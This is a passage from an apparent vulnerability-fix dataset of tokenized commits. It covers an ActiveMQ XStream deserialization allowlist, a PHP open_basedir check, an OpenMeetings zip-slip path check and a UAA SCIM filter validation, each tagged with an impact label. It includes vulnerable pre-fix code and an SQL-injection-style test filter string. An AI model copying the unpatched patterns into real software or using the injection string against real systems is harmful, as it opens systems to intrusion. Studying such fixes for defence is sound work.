"private", "void", "checkSecurity", "(", "Class", "clazz", ")", "throws", "ClassNotFoundException", "{", "if", "(", "!", "clazz", ".", "isPrimitive", "(", "))", "{", "if", "(", "clazz", ".", "getPackage", "(", ")", "!", "=", "null", "&", "&", "!", "isAllAllowed", "(", "))", "{", "boolean", "found", "=", "false", ";", "for", "(", "String", "packageName", ":", "getSerialziablePackages", "(", "))", "{", "if", "(", "clazz", ".", "getPackage", "(", ").", "getName", "(", ").", "equals", "(", "packageName", ")", "|", "|", "clazz", ".", "getPackage", "(", ").", "getName", "(", ").", "startsWith", "(", "packageName", "+", "\"", ".\"", "))", "{", "found", "=", "true", ";", "break", ";", "}", "}", "if", "(", "!", "found", ")", "{", "throw", "new", "ClassNotFoundException", "(", "\"", "Forbidden", "\"", "+", "clazz", "+", "\"", "!", "This", "class", "is", "not", "allowed", "to", "be", "serialized", ".", "Add", "package", "with", "'", "org", ".", "apache", ".", "activemq", ".", "SERIALIZABLE_PACKAGES", "'", "system", "property", ".", "\")", ";", "}", "}", "import", "org", ".", "apache", ".", "activemq", ".", "transport", ".", "stomp", ".", "XStreamSupport", ";", "final", "XStream", "xstream", "=", "XStreamSupport", ".", "createXStream", "(", ");", "throw", "new", "Exception", "(", "\"", "Unknown", "transformation", ":", "\"", "+", "transformation", ")", ";", "xstream", "=", "XStreamSupport", ".", "createXStream", "(", ");", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "activemq", ".", "transport", ".", "stomp", ";", "import", "com", ".", "thoughtworks", ".", "xstream", ".", "XStream", ";", "import", "com", ".", "thoughtworks", ".", "xstream", ".", "security", ".", "AnyTypePermission", ";", "import", "com", ".", "thoughtworks", ".", "xstream", ".", "security", ".", "NoTypePermission", ";", "import", "com", ".", "thoughtworks", ".", "xstream", ".", "security", ".", "PrimitiveTypePermission", ";", "import", "org", ".", "apache", ".", "activemq", ".", "util", ".", "ClassLoadingAwareObjectInputStream", ";", "import", "java", ".", "util", ".", "Collection", ";", "import", "java", ".", "util", ".", "Map", ";", "public", "class", "XStreamSupport", "{", "public", "static", "XStream", "createXStream", "(", ")", "{", "XStream", "stream", "=", "new", "XStream", "(", ");", "stream", ".", "addPermission", "(", "NoTypePermission", ".", "NONE", ")", ";", "stream", ".", "addPermission", "(", "PrimitiveTypePermission", ".", "PRIMITIVES", ")", ";", "stream", ".", "allowTypeHierarchy", "(", "Collection", ".", "class", ")", ";", "stream", ".", "allowTypeHierarchy", "(", "Map", ".", "class", ")", ";", "stream", ".", "allowTypes", "(", "new", "Class", "[", "]{", "String", ".", "class", "}", ");", "if", "(", "ClassLoadingAwareObjectInputStream", ".", "isAllAllowed", "(", "))", "{", "stream", ".", "addPermission", "(", "AnyTypePermission", ".", "ANY", ")", ";", "}", "else", "{", "for", "(", "String", "packageName", ":", "ClassLoadingAwareObjectInputStream", ".", "getSerialziablePackages", "(", "))", "{", "stream", ".", "allowTypesByWildcard", "(", "new", "String", "[", "]{", "packageName", "+", "\"", ".*", "*\"", "})", ";", "}", "}", "return", "stream", ";", "}", "}", "@", "@", "-", "119", ",", "7", "+", "119", ",", "7", "@", "@", "public", "void", "tearDown", "(", ")", "throws", "Exception", "{", "System", ".", "setProperty", "(", "\"", "org", ".", "apache", ".", "activemq", ".", "SERIALIZABLE_PACKAGES", "\"", ",", "\"", "*\"", ");", "import", "org", ".", "apache", ".", "activemq", ".", "transport", ".", "stomp", ".", "XStreamSupport", ";", "XStream", "stream", "=", "XStreamSupport", ".", "createXStream", "(", ");", "}", "catch", "(", "Exception", "e", ")", "{", "return", "new", "String", "(", "\"", "Cannot", "display", "ObjectMessage", "body", ".", "Reason", ":", "\"", "+", "e", ".", "getMessage", "(", "))", ";</s>return", "load", "(", "classDesc", ".", "getName", "(", "),", "cl", ",", "inLoader", ")", ";", "return", "Proxy", ".", "getProxyClass", "(", "cl", ",", "cinterfaces", ")", ";", "return", "Proxy", ".", "getProxyClass", "(", "inLoader", ",", "cinterfaces", ")", ";", "return", "Proxy", ".", "getProxyClass", "(", "FALLBACK_CLASS_LOADER", ",", "cinterfaces", ")", ";", "throw", "new", "ClassNotFoundException", "(", "null", ",", "e", ")", ";", "import", "com", ".", "thoughtworks", ".", "xstream", ".", "converters", ".", "ConverterLookup", ";", "final", "XStream", "xstream", "=", "new", "XStream", "(", ");", "throw", "new", "Exception", "(", "\"", "Unkown", "transformation", ":", "\"", "+", "transformation", ")", ";", "xstream", "=", "new", "XStream", "(", ");", "XStream", "stream", "=", "new", "XStream", "(", ");", "}", "catch", "(", "JMSException", "e", ")", "{", "return", "e", ";"], "docstring_tokens": ["execute", "arbitrary", "code", "on", "the", "system"]}
{"contents": ["Fixed", "bug", "#76459", "windows", "linkinfo", "lacks", "openbasedir", "check"], "code_tokens": ["char", "*", "dirname", ";", "int", "link_len", ",", "dir_len", ";", "dirname", "=", "estrndup", "(", "link", ",", "link_len", ")", ";", "dir_len", "=", "php_dirname", "(", "dirname", ",", "link_len", ")", ";", "if", "(", "php_check_open_basedir", "(", "dirname", "TSRMLS_CC", ")", ")", "{", "efree", "(", "dirname", ")", ";", "RETURN_FALSE", ";", "}", "efree", "(", "dirname", ")", ";", "efree", "(", "dirname", ")", ";</s>int", "link_len", ";"], "docstring_tokens": ["obtain", "files", "on", "paths", "outside", "of", "the", "allowed", "directories"]}
{"contents": ["[OPENMEETINGS-1354]", "backup", "extraction", "is", "improved,", "code", "clean-up"], "code_tokens": ["import", "org", ".", "apache", ".", "openmeetings", ".", "db", ".", "dao", ".", "user", ".", "PrivateMessageFolderDao", ";", "try", "(", "FileOutputStream", "fos", "=", "new", "FileOutputStream", "(", "zipFile", ")", ";", "ZipOutputStream", "zos", "=", "new", "ZipOutputStream", "(", "fos", ")", ")", "{", "private", "File", "validate", "(", "String", "zipname", ",", "File", "intended", ")", "throws", "IOException", "{", "final", "String", "intendedPath", "=", "intended", ".", "getCanonicalPath", "(", ");", "if", "(", "File", ".", "pathSeparatorChar", "!", "=", "'", "\\\\", "'", "&", "&", "zipname", ".", "indexOf", "(", "'\\", "\\'", ")", ">", "-", "1", ")", "{", "zipname", "=", "zipname", ".", "replace", "(", "'\\", "\\'", ",", "'", "/'", ");", "}", "/", "/", "for", "each", "entry", "to", "be", "extracted", "File", "fentry", "=", "new", "File", "(", "intended", ",", "zipname", ")", ";", "final", "String", "canonicalPath", "=", "fentry", ".", "getCanonicalPath", "(", ");", "if", "(", "canonicalPath", ".", "startsWith", "(", "intendedPath", ")", ")", "{", "return", "fentry", ";", "}", "else", "{", "throw", "new", "IllegalStateException", "(", "\"", "File", "is", "outside", "extraction", "target", "directory", ".", "\")", ";", "}", "}", "private", "File", "unzip", "(", "InputStream", "is", ")", "throws", "IOException", "{", "File", "f", "=", "OmFileHelper", ".", "getNewDir", "(", "OmFileHelper", ".", "getUploadImportDir", "(", "),", "\"", "import_", "\"", "+", "CalendarPatterns", ".", "getTimeForStreamId", "(", "new", "Date", "(", "))", ");", "log", ".", "debug", "(", "\"#", "##", "##", "EXTRACTING", "BACKUP", "TO", ":", "\"", "+", "f", ")", ";", "try", "(", "ZipInputStream", "zis", "=", "new", "ZipInputStream", "(", "is", ")", ")", "{", "ZipEntry", "zipentry", "=", "null", ";", "while", "(", "(", "zipentry", "=", "zis", ".", "getNextEntry", "(", "))", "!", "=", "null", ")", "{", "/", "/", "for", "each", "entry", "to", "be", "extracted", "File", "fentry", "=", "validate", "(", "zipentry", ".", "getName", "(", "),", "f", ")", ";", "File", "dir", "=", "zipentry", ".", "isDirectory", "(", ")", "?", "fentry", ":", "fentry", ".", "getParentFile", "(", ");", "if", "(", "!", "dir", ".", "exists", "(", "))", "{", "if", "(", "!", "dir", ".", "mkdirs", "(", "))", "{", "log", ".", "warn", "(", "\"", "Failed", "to", "create", "folders", ":", "\"", "+", "dir", ")", ";", "}", "}", "if", "(", "!", "fentry", ".", "isDirectory", "(", "))", "{", "FileHelper", ".", "copy", "(", "zis", ",", "fentry", ")", ";", "zis", ".", "closeEntry", "(", ");", "}", "}", "return", "f", ";", "}", "public", "void", "performImport", "(", "InputStream", "is", ")", "throws", "Exception", "{", "File", "f", "=", "unzip", "(", "is", ")", ";", "try", "(", "InputStream", "is", "=", "new", "FileInputStream", "(", "backup", ")", ")", "{</s>import", "java", ".", "util", ".", "Date", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "javax", ".", "servlet", ".", "ServletContext", ";", "import", "javax", ".", "servlet", ".", "ServletException", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletRequest", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletResponse", ";", "import", "org", ".", "apache", ".", "openmeetings", ".", "db", ".", "dao", ".", "server", ".", "SessiondataDao", ";", "import", "org", ".", "apache", ".", "openmeetings", ".", "db", ".", "dao", ".", "user", ".", "PrivateMessageFolderDao", ";", "import", "org", ".", "apache", ".", "openmeetings", ".", "db", ".", "entity", ".", "user", ".", "User", ".", "Right", ";", "import", "org", ".", "apache", ".", "openmeetings", ".", "db", ".", "util", ".", "AuthLevelUtil", ";", "import", "org", ".", "apache", ".", "openmeetings", ".", "util", ".", "CalendarPatterns", ";", "private", "SessiondataDao", "sessiondataDao", ";", "@", "Autowired", "/", "*", "*", "(", "non", "-", "Javadoc", ")", "*", "*", "@", "see", "*", "javax", ".", "servlet", ".", "http", ".", "HttpServlet", "#", "doPost", "(", "javax", ".", "servlet", ".", "http", ".", "HttpServletRequest", "*", ",", "javax", ".", "servlet", ".", "http", ".", "HttpServletResponse", ")", "*", "/", "public", "void", "service", "(", "HttpServletRequest", "request", ",", "HttpServletResponse", "response", ",", "ServletContext", "ctx", ")", "throws", "ServletException", ",", "IOException", "{", "String", "sid", "=", "request", ".", "getParameter", "(", "\"", "sid", "\"", ");", "if", "(", "sid", "=", "=", "null", ")", "{", "sid", "=", "\"", "default", "\"", ";", "}", "log", ".", "debug", "(", "\"", "sid", ":", "\"", "+", "sid", ")", ";", "Long", "userId", "=", "sessiondataDao", ".", "checkSession", "(", "sid", ")", ";", "Set", "<", "Right", ">", "rights", "=", "userDao", ".", "get", "(", "userId", ")", ".", "getRights", "(", ");", "log", ".", "debug", "(", "\"", "userId", ":", "\"", "+", "userId", ")", ";", "log", ".", "debug", "(", "\"", "user", "level", ":", "\"", "+", "rights", ")", ";", "if", "(", "AuthLevelUtil", ".", "hasAdminLevel", "(", "rights", ")", ")", "{", "/", "/", "if", "(", "true", ")", "{", "String", "includeFileOption", "=", "request", ".", "getParameter", "(", "\"", "includeFileOption", "\"", ");", "boolean", "includeFiles", "=", "includeFileOption", "=", "=", "null", "|", "|", "\"", "yes", "\"", ".", "equals", "(", "includeFileOption", ")", ";", "String", "moduleName", "=", "request", ".", "getParameter", "(", "\"", "moduleName", "\"", ");", "if", "(", "moduleName", "=", "=", "null", ")", "{", "moduleName", "=", "\"", "moduleName", "\"", ";", "}", "log", ".", "debug", "(", "\"", "moduleName", ":", "\"", "+", "moduleName", ")", ";", "if", "(", "moduleName", ".", "equals", "(", "\"", "backup", "\"", "))", "{", "/", "*", "*", "#", "##", "##", "##", "##", "##", "##", "##", "##", "##", "##", "Create", "Base", "Folder", "structure", "*", "/", "File", "working_dir", "=", "OmFileHelper", ".", "getUploadBackupDir", "(", ");", "String", "dateString", "=", "\"", "backup_", "\"", "+", "CalendarPatterns", ".", "getTimeForStreamId", "(", "new", "Date", "(", "))", ";", "File", "backup_dir", "=", "new", "File", "(", "working_dir", ",", "dateString", ")", ";", "String", "requestedFile", "=", "dateString", "+", "\"", ".", "zip", "\"", ";", "File", "backupFile", "=", "new", "File", "(", "backup_dir", ",", "requestedFile", ")", ";", "try", "{", "performExport", "(", "backupFile", ",", "backup_dir", ",", "includeFiles", ",", "new", "ProgressHolder", "(", "))", ";", "response", ".", "reset", "(", ");", "response", ".", "resetBuffer", "(", ");", "response", ".", "setContentType", "(", "\"", "APPLICATION", "/", "OCTET", "-", "STREAM", "\"", ");", "response", ".", "setHeader", "(", "\"", "Content", "-", "Disposition", "\"", ",", "\"", "attachment", ";", "filename", "=", "\\\"", "\"", "+", "requestedFile", "+", "\"", "\\\"", "\")", ";", "response", ".", "setHeader", "(", "\"", "Content", "-", "Length", "\"", ",", "\"", "\"", "+", "backupFile", ".", "length", "(", "))", ";", "OutputStream", "out", "=", "response", ".", "getOutputStream", "(", ");", "OmFileHelper", ".", "copyFile", "(", "backupFile", ",", "out", ")", ";", "out", ".", "flush", "(", ");", "out", ".", "close", "(", ");", "}", "catch", "(", "Exception", "er", ")", "{", "log", ".", "error", "(", "\"", "Error", "exporting", ":", "\"", ",", "er", ")", ";", "}", "if", "(", "backupFile", ".", "exists", "(", "))", "{", "/", "/", "log", ".", "debug", "(", "\"", "DELETE", ":", "1", ":", "\"", "+", "backupFile", ".", "getCanonicalPath", "(", "))", ";", "backupFile", ".", "delete", "(", ");", "}", "FileHelper", ".", "removeRec", "(", "backup_dir", ")", ";", "}", "}", "else", "{", "log", ".", "error", "(", "\"", "BackupExport", ":", "not", "authorized", "FileDownload", "\"", ");", "}", "}", "FileOutputStream", "fos", "=", "null", ";", "ZipOutputStream", "zos", "=", "null", ";", "try", "{", "fos", "=", "new", "FileOutputStream", "(", "zipFile", ")", ";", "zos", "=", "new", "ZipOutputStream", "(", "fos", ")", ";", "}", "finally", "{", "if", "(", "zos", "!", "=", "null", ")", "{", "try", "{", "zos", ".", "close", "(", ");", "}", "catch", "(", "IOException", "e", ")", "{", "log", ".", "debug", "(", "\"", "Enexpected", "error", "while", "closing", "ZipOutputStream", "\"", ",", "e", ")", ";", "}", "}", "if", "(", "fos", "!", "=", "null", ")", "{", "try", "{", "fos", ".", "close", "(", ");", "}", "catch", "(", "IOException", "e", ")", "{", "log", ".", "debug", "(", "\"", "Enexpected", "error", "while", "closing", "FileOutputStream", "\"", ",", "e", ")", ";", "}", "}", "public", "void", "performImport", "(", "InputStream", "is", ")", "throws", "Exception", "{", "File", "working_dir", "=", "OmFileHelper", ".", "getUploadImportDir", "(", ");", "if", "(", "!", "working_dir", ".", "exists", "(", "))", "{", "working_dir", ".", "mkdir", "(", ");", "File", "f", "=", "OmFileHelper", ".", "getNewDir", "(", "working_dir", ",", "\"", "import_", "\"", "+", "CalendarPatterns", ".", "getTimeForStreamId", "(", "new", "Date", "(", "))", ");", "log", ".", "debug", "(", "\"#", "##", "##", "WRITE", "FILE", "TO", ":", "\"", "+", "f", ")", ";", "ZipInputStream", "zipinputstream", "=", "new", "ZipInputStream", "(", "is", ")", ";", "ZipEntry", "zipentry", "=", "zipinputstream", ".", "getNextEntry", "(", ");", "while", "(", "zipentry", "!", "=", "null", ")", "{", "String", "fName", "=", "zipentry", ".", "getName", "(", ");", "if", "(", "File", ".", "pathSeparatorChar", "!", "=", "'", "\\\\", "'", "&", "&", "fName", ".", "indexOf", "(", "'\\", "\\'", ")", ">", "-", "1", ")", "{", "fName", "=", "fName", ".", "replace", "(", "'\\", "\\'", ",", "'", "/'", ");", "}", "/", "/", "for", "each", "entry", "to", "be", "extracted", "File", "fentry", "=", "new", "File", "(", "f", ",", "fName", ")", ";", "File", "dir", "=", "zipentry", ".", "isDirectory", "(", ")", "?", "fentry", ":", "fentry", ".", "getParentFile", "(", ");", "if", "(", "!", "dir", ".", "exists", "(", "))", "{", "dir", ".", "mkdirs", "(", ");", "}", "if", "(", "fentry", ".", "isDirectory", "(", "))", "{", "zipentry", "=", "zipinputstream", ".", "getNextEntry", "(", ");", "continue", ";", "}", "FileHelper", ".", "copy", "(", "zipinputstream", ",", "fentry", ")", ";", "zipinputstream", ".", "closeEntry", "(", ");", "zipentry", "=", "zipinputstream", ".", "getNextEntry", "(", ");", "}", "zipinputstream", ".", "close", "(", ");", "import", "java", ".", "io", ".", "IOException", ";", "InputStream", "is", "=", "null", ";", "try", "{", "is", "=", "new", "FileInputStream", "(", "backup", ")", ";", "}", "finally", "{", "if", "(", "is", "!", "=", "null", ")", "{", "try", "{", "is", ".", "close", "(", ");", "}", "catch", "(", "IOException", "e", ")", "{", "throw", "new", "RuntimeException", "(", "\"", "Error", "while", "closing", "ldap", "config", "file", "\"", ",", "e", ")", ";", "}", "}"], "docstring_tokens": ["view", "arbitrary", "files", "on", "the", "system"]}
{"contents": ["better", "parsing", "of", "attributes"], "code_tokens": ["import", "com", ".", "unboundid", ".", "scim", ".", "sdk", ".", "InvalidResourceException", ";", "import", "java", ".", "text", ".", "DateFormat", ";", "import", "java", ".", "text", ".", "ParseException", ";", "import", "java", ".", "text", ".", "SimpleDateFormat", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "LinkedList", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "static", "java", ".", "util", ".", "Collections", ".", "emptyList", ";", "import", "static", "java", ".", "util", ".", "Optional", ".", "ofNullable", ";", "/", "/", "LOWER", "public", "static", "final", "List", "<", "String", ">", "VALID_ATTRIBUTE_NAMES", "=", "Collections", ".", "unmodifiableList", "(", "Arrays", ".", "asList", "(", "\"", "id", "\"", ",", "\"", "created", "\"", ",", "\"", "lastmodified", "\"", ",", "\"", "version", "\"", ",", "\"", "username", "\"", ",", "\"", "password", "\"", ",", "\"", "email", "\"", ",", "\"", "givenname", "\"", ",", "\"", "familyname", "\"", ",", "\"", "name", ".", "familyname", "\"", ",", "\"", "name", ".", "givenname", "\"", ",", "\"", "active", "\"", ",", "\"", "phonenumber", "\"", ",", "\"", "verified", "\"", ",", "\"", "origin", "\"", ",", "\"", "identity_zone_id", "\"", ",", "\"", "passwd_lastmodified", "\"", ",", "\"", "passwd_change_required", "\"", ",", "\"", "last_logon_success_time", "\"", ",", "\"", "previous_logon_success_time", "\"", ",", "\"", "displayname", "\"", ",", "\"", "scope", "\"", ",", "\"", "group_id", "\"", ",", "\"", "member_id", "\"", ",", "\"", "member_type", "\"", ",", "\"", "description", "\"", ",", "\"", "client_id", "\"", ",", "\"", "authorized_grant_types", "\"", ",", "\"", "web_server_redirect_uri", "\"", ",", "\"", "redirect_uri", "\"", ",", "\"", "access_token_validity", "\"", ",", "\"", "refresh_token_validity", "\"", ",", "\"", "autoapprove", "\"", ",", "\"", "show_on_home_page", "\"", ",", "\"", "created_by", "\"", ",", "\"", "required_user_groups", "\"", ",", "\"", "user_id", "\"", ",", "\"", "meta", ".", "lastmodified", "\"", ",", "\"", "meta", ".", "created", "\"", ",", "\"", "meta", ".", "location", "\"", ",", "\"", "meta", ".", "resourcetype", "\"", ",", "\"", "meta", ".", "version", "\"", ",", "\"", "emails", ".", "value", "\"", ",", "\"", "groups", ".", "display", "\"", ",", "\"", "phonenumbers", ".", "value", "\"", ",", "\"", "gm", ".", "external_group", "\"", ",", "\"", "gm", ".", "origin", "\"", ",", "\"", "g", ".", "displayname", "\"", ",", "\"", "g", ".", "id", "\"", ")", ")", ";", "public", "SimpleSearchQueryConverter", "(", ")", "{", "}", "protected", "SCIMFilter", "scimFilter", "(", "String", "filter", ")", "throws", "SCIMException", "{", "validateFilterAttributes", "(", "scimFilter", ")", ";", "private", "void", "validateFilterAttributes", "(", "SCIMFilter", "filter", ")", "throws", "SCIMException", "{", "List", "<", "String", ">", "invalidAttributes", "=", "new", "LinkedList", "<", ">(", ");", "validateFilterAttributes", "(", "filter", ",", "invalidAttributes", ")", ";", "if", "(", "!", "invalidAttributes", ".", "isEmpty", "(", "))", "{", "throw", "new", "InvalidResourceException", "(", "\"", "Invalid", "filter", "attributes", ":", "\"+", "StringUtils", ".", "collectionToCommaDelimitedString", "(", "invalidAttributes", ")", ");", "}", "}", "private", "void", "validateFilterAttributes", "(", "SCIMFilter", "filter", ",", "List", "<", "String", ">", "invalidAttribues", ")", "{", "if", "(", "filter", ".", "getFilterAttribute", "(", ")!", "=", "null", "&", "&", "filter", ".", "getFilterAttribute", "(", ").", "getAttributeName", "(", ")!", "=", "null", ")", "{", "String", "name", "=", "filter", ".", "getFilterAttribute", "(", ").", "getAttributeName", "(", ");", "if", "(", "filter", ".", "getFilterAttribute", "(", ").", "getSubAttributeName", "(", ")!", "=", "null", ")", "{", "name", "=", "name", "+", "\"", ".\"", "+", "filter", ".", "getFilterAttribute", "(", ").", "getSubAttributeName", "(", ");", "}", "if", "(", "!", "VALID_ATTRIBUTE_NAMES", ".", "contains", "(", "name", ".", "toLowerCase", "(", "))", ")", "{", "invalidAttribues", ".", "add", "(", "name", ")", ";", "}", "}", "for", "(", "SCIMFilter", "subfilter", ":", "ofNullable", "(", "filter", ".", "getFilterComponents", "(", "))", ".", "orElse", "(", "emptyList", "(", "))", ")", "{", "validateFilterAttributes", "(", "subfilter", ",", "invalidAttribues", ")", ";", "}", "}", "protected", "String", "comparisonClause", "(", "SCIMFilter", "filter", ",", "String", "comparator", ",", "Map", "<", "String", ",", "Object", ">", "values", ",", "String", "valuePrefix", ",", "String", "valueSuffix", ",", "String", "paramPrefix", ")", "{", "/", "*", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "Cloud", "Foundry", "*", "Copyright", "(", "c", ")", "[", "2009", "-", "2017", "]", "Pivotal", "Software", ",", "Inc", ".", "All", "Rights", "Reserved", ".", "*", "*", "This", "product", "is", "licensed", "to", "you", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ").", "*", "You", "may", "not", "use", "this", "product", "except", "in", "compliance", "with", "the", "License", ".", "*", "*", "This", "product", "includes", "a", "number", "of", "subcomponents", "with", "*", "separate", "copyright", "notices", "and", "license", "terms", ".", "Your", "use", "of", "these", "*", "subcomponents", "is", "subject", "to", "the", "terms", "and", "conditions", "of", "the", "*", "subcomponent", "'", "s", "license", ",", "as", "noted", "in", "the", "LICENSE", "file", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "/", "package", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "resources", ".", "jdbc", ";", "import", "com", ".", "unboundid", ".", "scim", ".", "sdk", ".", "InvalidResourceException", ";", "import", "com", ".", "unboundid", ".", "scim", ".", "sdk", ".", "SCIMFilter", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "scim", ".", "jdbc", ".", "ScimSearchQueryConverter", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "junit", ".", "rules", ".", "ExpectedException", ";", "import", "java", ".", "util", ".", "concurrent", ".", "atomic", ".", "AtomicInteger", ";", "import", "static", "java", ".", "util", ".", "Collections", ".", "emptyList", ";", "import", "static", "java", ".", "util", ".", "Optional", ".", "ofNullable", ";", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "containsString", ";", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "startsWith", ";", "public", "class", "SimpleSearchQueryConverterTests", "{", "SimpleSearchQueryConverter", "converter", ";", "String", "query", "=", "\"", "user_id", "eq", "\\", "\"", "7e2345e8", "-", "8bbf", "-", "4eaa", "-", "9bc3", "-", "ae1ba610f890", "\\", "\"\"", "\"", "and", "\"", "\"", "client_id", "eq", "\\", "\"", "app", "\\", "\"\"", "\"", "and", "\"", "\"", "meta", ".", "lastmodified", "gt", "\\", "\"", "some", "-", "value", "\\", "\"\"", "\"", "and", "\"", "\"", "(", "an", "/", "**", "/", "invalid", "/", "**", "/", "attribute", "/", "**", "/", "and", "/", "**", "/", "1", "\"", "+", "/", "/", "invalid", "attribute", "name", "\"", "pr", "\"", "+", "/", "/", "operator", "(", "present", ")", "\"", "and", "\"", "+", "\"", "1", "eq", "1", ")", "\"", "+", "/", "/", "invalid", "attribute", "name", "1", "\"", "and", "\"", "\"", "\\\"", "1", "\\", "\"", "eq", "\\", "\"", "1", "\\", "\"\"", ";", "String", "validQuery", "=", "\"", "user_id", "eq", "\\", "\"", "7e2345e8", "-", "8bbf", "-", "4eaa", "-", "9bc3", "-", "ae1ba610f890", "\\", "\"\"", "\"", "and", "\"", "\"", "client_id", "eq", "\\", "\"", "app", "\\", "\"\"", "\"", "and", "\"", "\"", "meta", ".", "lastmodified", "gt", "\\", "\"", "some", "-", "value", "\\", "\"\"", "\"", "and", "\"", "\"", "meta", ".", "created", "pr", "\"", ";", "@", "Rule", "public", "ExpectedException", "exception", "=", "ExpectedException", ".", "none", "(", ");", "@", "Before", "public", "void", "setup", "(", ")", "{", "converter", "=", "new", "ScimSearchQueryConverter", "(", ");", "}", "@", "Test", "public", "void", "test_query", "(", ")", "throws", "Exception", "{", "exception", ".", "expect", "(", "InvalidResourceException", ".", "class", ")", ";", "exception", ".", "expectMessage", "(", "startsWith", "(", "\"", "Invalid", "filter", "attributes", "\"", "))", ";", "exception", ".", "expectMessage", "(", "containsString", "(", "\"", "an", "/", "**", "/", "invalid", "/", "**", "/", "attribute", "/", "**", "/", "and", "/", "**", "/", "1", "\"", "))", ";", "exception", ".", "expectMessage", "(", "containsString", "(", "\"", "1", "\"", "))", ";", "exception", ".", "expectMessage", "(", "containsString", "(", "\"\\", "\"", "1", "\\", "\"\"", "))", ";", "SCIMFilter", "filter", "=", "converter", ".", "scimFilter", "(", "query", ")", ";", "}", "@", "Test", "public", "void", "print_query", "(", ")", "throws", "Exception", "{", "SCIMFilter", "filter", "=", "converter", ".", "scimFilter", "(", "validQuery", ")", ";", "printFilterAttributes", "(", "filter", ",", "new", "AtomicInteger", "(", "0", ")", ");", "}", "public", "void", "printFilterAttributes", "(", "SCIMFilter", "filter", ",", "AtomicInteger", "pos", ")", "{", "if", "(", "filter", ".", "getFilterAttribute", "(", ")", "!", "=", "null", ")", "{", "String", "name", "=", "filter", ".", "getFilterAttribute", "(", ").", "getAttributeName", "(", ");", "if", "(", "filter", ".", "getFilterAttribute", "(", ").", "getSubAttributeName", "(", ")", "!", "=", "null", ")", "{", "name", "=", "name", "+", "\"", ".\"", "+", "filter", ".", "getFilterAttribute", "(", ").", "getSubAttributeName", "(", ");", "}", "System", ".", "out", ".", "println", "(", "(", "pos", ".", "incrementAndGet", "(", "))", "+", "\"", ".", "Attribute", "name", ":", "\"", "+", "name", ")", ";", "}", "for", "(", "SCIMFilter", "subfilter", ":", "ofNullable", "(", "filter", ".", "getFilterComponents", "(", "))", ".", "orElse", "(", "emptyList", "(", "))", ")", "{", "printFilterAttributes", "(", "subfilter", ",", "pos", ")", ";", "}", "}", "}", "validate", "(", "filterProcessor", ".", "convert", "(", "\"", "Version", "eq", "1000000", ".", "45", "\"", ",", "null", ",", "false", ")", ",\"", "Version", "=", ":", "__value_0", "\"", ",", "1", ",", "Double", ".", "class", ")", ";", "validate", "(", "filterProcessor", ".", "convert", "(", "\"", "meta", ".", "VerSion", "eq", "1000000", "\"", ",", "null", ",", "false", ")", ",\"", "VerSion", "=", ":", "__value_0", "\"", ",", "1", ",", "Double", ".", "class", ")", ";", "validate", "(", "filterProcessor", ".", "convert", "(", "\"", "Version", "eq", "1000000", ".", "45", "\"", ",", "null", ",", "false", ")", ",\"", "Version", "=", ":", "__value_0", "\"", ",", "1", ",", "Double", ".", "class", ")", ";", "validate", "(", "filterProcessor", ".", "convert", "(", "\"", "meta", ".", "VerSion", "eq", "1000000", "\"", ",", "null", ",", "false", ")", ",\"", "VerSion", "=", ":", "__value_0", "\"", ",", "1", ",", "Double", ".", "class", ")", ";</s>import", "java", ".", "text", ".", "DateFormat", ";", "import", "java", ".", "text", ".", "ParseException", ";", "import", "java", ".", "text", ".", "SimpleDateFormat", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "Map", ";", "private", "SCIMFilter", "scimFilter", "(", "String", "filter", ")", "throws", "SCIMException", "{", "protected", "String", "comparisonClause", "(", "SCIMFilter", "filter", ",", "String", "comparator", ",", "Map", "<", "String", ",", "Object", ">", "values", ",", "String", "valuePrefix", ",", "String", "valueSuffix", ",", "String", "paramPrefix", ")", "{", "validate", "(", "filterProcessor", ".", "convert", "(", "\"", "test", "eq", "1000000", ".", "45", "\"", ",", "null", ",", "false", ")", ",\"", "test", "=", ":", "__value_0", "\"", ",", 